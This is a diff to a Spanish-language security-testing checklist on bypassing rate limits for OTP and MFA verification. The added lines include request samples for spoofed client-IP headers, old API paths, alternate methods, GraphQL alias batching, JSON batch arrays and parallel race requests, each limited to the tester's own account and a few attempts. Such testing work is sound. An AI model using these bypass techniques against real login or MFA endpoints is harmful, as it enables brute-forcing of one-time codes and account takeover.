@@ -8,59 +8,132 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### Control de cuota con pocos intentos
+
+```http
+POST /api/test-otp/check HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_A}
+Content-Type: application/json
+
+{"code":"000000"}
+```
+
+**Cuándo usarlo:** Usar cuenta propia y un número mínimo permitido de intentos; anotar Retry-After y estado de bloqueo.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication).
+
+
+### Cabeceras de IP aportadas por cliente
+
+```text
+X-Forwarded-For: 192.0.2.10
+X-Real-IP: 192.0.2.11
+Forwarded: for=192.0.2.12
+True-Client-IP: 192.0.2.13
+```
+
+**Cuándo usarlo:** Probar una por vez; direcciones TEST-NET. El cambio de cabecera no prueba que el contador cambió.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Brute%20Force%20Rate%20Limit/README.md).
+
+
+## 🧭 Payloads por contexto
+
+### Cambios de superficie para la misma acción
+
+```text
+POST /api/v1/test-otp/check
+POST /api/v2/test-otp/check
+POST /graphql  → mutation verifyTestCode(...)
+POST /api/test-otp/batch  → dos códigos propios
+```
+
+**Cuándo usarlo:** Solo comparar superficies que efectivamente ejecuten la misma verificación y estén en alcance.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Brute%20Force%20Rate%20Limit/README.md).
+
+
+## 🔥 Payloads avanzados
+
+### Dos alias GraphQL con control de presupuesto
+
+```graphql
+mutation {
+  a: verifyTestCode(code:"000000") { ok }
+  b: verifyTestCode(code:"000000") { ok }
+}
+```
+
+**Cuándo usarlo:** Adaptar al esquema si verifyTestCode es una mutación. Dos alias bastan para comprobar si el contador se aplica por campo; no hacer fuerza bruta.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. Línea base de tres intentos
 
-**Objetivo:** Estimar contador sin fuerza bruta.
+**Objetivo:** Con un flujo OTP propio, enviar solo tres códigos inválidos distintos.
 
-```bash
-for n in 1 2 3; do curl -s -o /dev/null -w "%{http_code}\n" "https://{ORIGEN}/api/test-owned"; done
+```http
+POST /api/mfa/verify HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}
+Content-Type: application/json
+
+{"code":"{OTP_INVALIDO_PROPIO_1}"}
 ```
 
-**Interpretación:** Ausencia de 429 no demuestra límite ausente; puede haber ventana mayor o control silencioso.
+**Interpretación:** Repetir con OTP_INVALIDO_PROPIO_2 y 3; registrar contador, bloqueo y ventana. Ausencia de 429 no prueba límite ausente.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).
 
 ### 2. X-Forwarded-For no confiable
 
 **Objetivo:** Comprobar si el contador usa un valor aportado por cliente.
 
 ```http
-GET /api/test-owned HTTP/1.1
+POST /api/mfa/verify HTTP/1.1
 Host: {ORIGEN}
+Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}
 X-Forwarded-For: 192.0.2.10
+Content-Type: application/json
+
+{"code":"{OTP_INVALIDO_PROPIO}"}
 ```
 
-**Interpretación:** Comparar con control sin cabecera y pocas solicitudes; cambios de IP en logs no prueban bypass del límite.
+**Interpretación:** Comparar cuota real sin cabecera y, en otra request, con X-Real-IP; son variantes del mismo control de proxy.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
 
-### 3. X-Real-IP no confiable
+### 3. Dos OTP simultáneos ante límite de uno
 
-**Objetivo:** Probar un segundo encabezado de proxy con IP de documentación.
+**Objetivo:** En laboratorio con cuota de un intento por ventana, enviar dos códigos inválidos propios a la vez.
 
-```http
-GET /api/test-owned HTTP/1.1
-Host: {ORIGEN}
-X-Real-IP: 192.0.2.11
+```text
+Burp Repeater: grupo paralelo de dos POST /api/mfa/verify bajo la misma sesión propia.
 ```
 
-**Interpretación:** La decisión debe provenir de proxy confiable. No usar IPs de terceros.
+**Interpretación:** Registrar si ambos se procesan antes de actualizar contador. Dos respuestas HTTP iguales sin contador o efecto no prueban bypass.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits).
 
 ### 4. Cuenta frente a IP
 
 **Objetivo:** Distinguir si el control protege a la identidad o solo a la conexión.
 
 ```text
-Misma cuenta propia desde dos sesiones de prueba; 2 solicitudes por sesión; mismo endpoint.
+Misma cuenta propia y endpoint /api/mfa/verify desde dos sesiones: 2 intentos inválidos por sesión.
 ```
 
 **Interpretación:** Si el contador se separa por sesión, cuantificar ventana y precondiciones antes de afirmar riesgo de fuerza bruta.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/authentication/auth-lab-usernames).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/password-based).
 
 ### 5. Ruta de versión antigua
 
@@ -77,32 +150,57 @@ Content-Type: application/json
 
 **Interpretación:** Hacer pocos intentos y comparar con v2; si la ruta v1 no existe o responde genérico, no hay bypass.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
 
 ### 6. Método alterno
 
-**Objetivo:** Detectar si la cuota cubre solo un método.
+**Objetivo:** Detectar si la cuota cubre GET y POST cuando ambos verifican el mismo factor.
 
 ```http
-GET /api/test-owned?action=check HTTP/1.1
+GET /api/mfa/verify?code={OTP_INVALIDO_PROPIO} HTTP/1.1
 Host: {ORIGEN}
+Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}
 ```
 
-**Interpretación:** Solo comparar si GET y POST ejecutan la misma operación; un endpoint diferente no basta.
+**Interpretación:** Solo comparar si GET realmente ejecuta la misma verificación; de lo contrario no es un bypass de cuota.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
 
 ### 7. Respuesta 429 y Retry-After
 
-**Objetivo:** Registrar ventana real sin excederla.
+**Objetivo:** Registrar la política del mismo endpoint tras una prueba permitida.
 
 ```bash
-curl -i "https://{ORIGEN}/api/test-owned" | rg -i "HTTP/|retry-after|ratelimit"
+curl -sS -D - -o /dev/null -X POST -H "Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}" -H "Content-Type: application/json" --data '{"code":"{OTP_INVALIDO_PROPIO}"}' "https://{ORIGEN}/api/mfa/verify"
 ```
 
-**Interpretación:** Una cabecera es señal de política, pero el efecto debe verificarse con un caso permitido.
+**Interpretación:** Inspeccionar 429 y Retry-After sin superar la ventana; la cabecera sola no confirma que el límite proteja todas las rutas.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/authentication).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/password-based).
+
+### 8. GraphQL con dos alias
+
+**Objetivo:** Comprobar si la cuota cuenta operaciones dentro de una request.
+
+```graphql
+query { uno: verifyTestCode(code:"000000") { ok } dos: verifyTestCode(code:"000000") { ok } }
+```
+
+**Interpretación:** Máximo dos alias y cuenta propia; el esquema debe contener esa operación. Verificar contador real.
+
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).
+
+### 9. Batch JSON mínimo
+
+**Objetivo:** Comprobar si un lote de dos elementos elude la cuota por operación.
+
+```json
+[{"code":"000000"},{"code":"000000"}]
+```
+
+**Interpretación:** Si el endpoint admite lotes, medir si cada elemento se contabiliza; no escalar a fuerza bruta.
+
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).
 
 ## ✅ Evidencia mínima
 
